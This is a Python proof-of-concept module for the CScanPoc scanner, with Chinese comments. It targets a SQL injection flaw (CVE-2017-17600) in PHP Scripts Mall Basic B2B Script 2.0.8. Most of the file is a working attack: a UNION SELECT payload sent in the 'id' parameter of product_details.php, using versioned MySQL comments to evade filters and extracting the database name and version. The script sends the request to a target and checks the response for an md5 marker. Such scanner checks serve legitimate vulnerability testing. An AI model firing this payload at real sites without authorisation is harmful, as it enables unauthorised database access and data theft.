# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'PHP_Scripts_Mall_0001'  # 平台漏洞编号，留空
    name = 'PHP Scripts Mall Basic B2B Script SQL注入漏洞'  # 漏洞名称
    level = VulnLevel.HIGH   # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2017-12-15'  # 漏洞公布时间
    desc = '''
        PHP Scripts Mall Basic B2B Script是印度PHP Scripts Mall公司的一套基于PHP的B2B2（企业对企业）交易网站脚本。 
        PHP Scripts Mall Basic B2B Script 2.0.8版本中存在SQL注入漏洞。远程攻击者可通过向product_details.php文件发送‘id’参数利用该漏洞注入SQL命令。  
    '''  # 漏洞描述
    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2017-37213'  # 漏洞来源
    cnvd_id = 'CNVD-2017-37213'  # cnvd漏洞编号
    cve_id = 'CVE-2017-17600'  # cve编号
    product = 'PHP Scripts Mall'  # 漏洞应用名称
    product_version = ' 2.0.8'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'f147d7ee-38a3-4d98-b178-8f236157593f'
    author = '47bwy'  # POC编写者
    create_date = '2018-08-09'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }
                    
    def verify(self):
        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = "/product_details.php?id=-348'++/*!13337UNION*/+/*!13337SELECT*/+1,2,CONCAT_WS(0x203a20,md5(c),DATABASE(),VERSION()),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34--+--"
            url = self.target + payload
            self.output.info('请求网站product_details.php页面')
            print (url)
            r = requests.get(url)

            if "4a8a08f09d37b73795649038408b5f33" in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name,url=url))


        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
